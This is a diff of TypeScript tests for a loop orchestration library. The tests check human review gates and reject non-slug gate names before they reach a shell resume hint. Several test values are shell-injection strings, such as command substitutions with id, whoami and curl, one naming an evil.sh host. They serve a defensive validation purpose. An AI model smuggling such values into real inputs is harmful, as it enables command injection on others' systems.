@@ -150,6 +150,47 @@ describe('paused propagation: loop', () => {
   });
 });
 
+describe('paused propagation: loop review', () => {
+  it('a human gate as config.review pauses the loop instead of re-entering', async () => {
+    const events: LoopEvent[] = [];
+    const bodies: number[] = [];
+    const { outcome, stats } = await run(
+      loop({
+        name: 'l',
+        body: fnJob('work', async (ctx) => {
+          bodies.push(ctx.iteration);
+          return { status: 'pass' as const };
+        }),
+        review: humanGate({ name: 'sign-off', prompt: 'converged — approve?' }),
+        max: 5,
+      }),
+      { ...mockOpts, onEvent: (e) => events.push(e) },
+    );
+    expect(outcome.status).toBe('paused');
+    expect(pausedHumanGate(outcome)).toBe('sign-off');
+    // The body ran once; the unacknowledged gate did not burn iterations.
+    expect(bodies).toEqual([1]);
+    expect(stats.loops[0]?.iterations).toBe(1);
+    // The pause is not recorded as a rejected review.
+    expect(events.some((e) => e.kind === 'loop:review')).toBe(false);
+    const end = events.find((e) => e.kind === 'loop:end');
+    expect(end).toMatchObject({ outcome: { status: 'paused' } });
+  });
+
+  it('an acked review gate lets the loop pass', async () => {
+    const { outcome } = await run(
+      loop({
+        name: 'l',
+        body: fnJob('work', async () => ({ status: 'pass' as const })),
+        review: humanGate({ name: 'sign-off' }),
+        max: 5,
+      }),
+      { ...mockOpts, state: { [humanGateKey('sign-off')]: true } },
+    );
+    expect(outcome.status).toBe('pass');
+  });
+});
+
 describe('paused propagation: dag', () => {
   it('a paused node stops scheduling, blocks dependents, and pauses the dag', async () => {
     const ran: string[] = [];
@@ -328,6 +369,46 @@ describe('pausedHumanGate (the outcome-data contract reader)', () => {
       pausedHumanGate({ status: 'paused', summary: 'rate limit hit' }),
     ).toBeUndefined();
     expect(pausedHumanGate({ status: 'pass' })).toBeUndefined();
+  });
+
+  it('rejects a non-slug name arriving via raw outcome data (never pasted into the shell hint)', () => {
+    // The {humanGate, prompt} contract is public: a custom outcome mapper can
+    // put ANY string here without passing the constructor's validation. The
+    // reader must enforce the same slug the writer does.
+    for (const name of ['x;$(id)', 'x;curl$IFS-o-', '`whoami`', 'a|b&c', '']) {
+      expect(
+        pausedHumanGate({ status: 'paused', data: { humanGate: name } }),
+      ).toBeUndefined();
+    }
+    // A slug name in raw data still reads fine.
+    expect(
+      pausedHumanGate({ status: 'paused', data: { humanGate: 'ok-1' } }),
+    ).toBe('ok-1');
+  });
+});
+
+describe('the resume hint refuses a non-slug gate name', () => {
+  it('falls back to the generic guidance instead of pasting shell metacharacters', () => {
+    const chunks: string[] = [];
+    const write = vi
+      .spyOn(process.stderr, 'write')
+      .mockImplementation((chunk) => {
+        chunks.push(String(chunk));
+        return true;
+      });
+    try {
+      printResumeGuidance(
+        'deploy.loop.ts',
+        { checkpoint: 'ckpt.json' },
+        { status: 'paused', data: { humanGate: 'x;curl$(id).evil.sh' } },
+      );
+    } finally {
+      write.mockRestore();
+    }
+    const text = chunks.join('');
+    expect(text).toContain('at a limit');
+    expect(text).not.toContain('--ack');
+    expect(text).not.toContain('curl');
   });
 });
 
